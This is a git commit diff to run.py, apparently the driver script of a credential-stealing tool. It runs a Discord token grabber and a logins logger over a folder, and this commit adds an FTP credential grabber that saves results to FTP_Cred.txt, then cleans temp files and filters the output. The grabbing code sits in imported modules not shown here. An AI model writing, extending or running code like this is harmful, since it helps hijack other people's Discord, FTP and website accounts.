6209b0389c68e725881decc064471c15c3f511ee
Abhay Thakur <48170773+falcon71181@users.noreply.github.com>
2023-09-11 13:21:49 +0530

    Update run.py

--- run.py
+++ run.py
@@ -4,6 +4,7 @@ from resources.rename import rename_folders
 from resources.DiscordTokens import token_grabber
 from resources.logins import *
 from resources.filter import *
+from resources.ftp import *
 
 def runner(base_folder):
     if not os.path.exists(base_folder):
@@ -11,11 +12,16 @@ def runner(base_folder):
         return
     else:
         rename_folders(os.path.join(base_folder))
-        print("----Starting DIscord Token Grabber.---- ")
+        print("----Starting Discord Token Grabber.---- ")
         time.sleep(5)
         if not os.path.exists("Discord"):
             os.makedirs("Discord")
         token_grabber(base_folder ,os.path.join("Discord","DiscordTokens.txt"))
+        print("----Starting FTP Cred. Grabber.----")
+        time.sleep(5)
+        if not os.path.exists("FTP"):
+            os.makedirs("FTP")
+        runftp(base_folder, os.path.join("FTP","FTP_Cred.txt"))
         print("----Starting logger.----")
         time.sleep(5)
         if not os.path.exists("logins"):
@@ -24,10 +30,12 @@ def runner(base_folder):
         print("----Successfully logged .. Clearing temp files.----")
         time.sleep(5)
         os.remove("temp.txt")
+        os.remove("ftp_temp.txt")
         print("----Starting Filtering.----")
         time.sleep(5)
         filter_files("Discord")
         filter_files("logins")
+        filter_files("FTP")
         print("-----------------------ALL DONE.-----------------------")
 
 if __name__ == "__main__":
